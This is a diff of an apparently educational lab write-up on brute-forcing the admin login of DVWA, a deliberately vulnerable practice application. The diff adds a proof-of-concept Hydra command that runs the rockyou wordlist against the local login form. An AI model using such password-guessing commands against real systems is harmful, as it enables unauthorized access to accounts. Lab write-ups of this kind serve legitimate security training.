@@ -26,7 +26,10 @@ The DVWA /vulnerabilities/brute URL is vulnerable to user authentication brute f
 We were able to sucessfully attain the password for the 'admin' account and gain access to the 'Protected Admin Area' 
 
 ## Proof of Concept
-For POC, we will make use of the Hydra tool for brute forcing. We are Faced with the login page.
+For POC, we will make use of the Hydra tool for brute forcing the following login page.
 ![이미지](/assets/loginpage.png)
-In order to use Hydra, we figure out that the login is using a http-get-form. We will then use the following code 
+In order to use Hydra, we figure out that the login is using a http-get-form. We will then use the following code
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
+```` 
 ![이미지](/assets/Brtueforce.png)
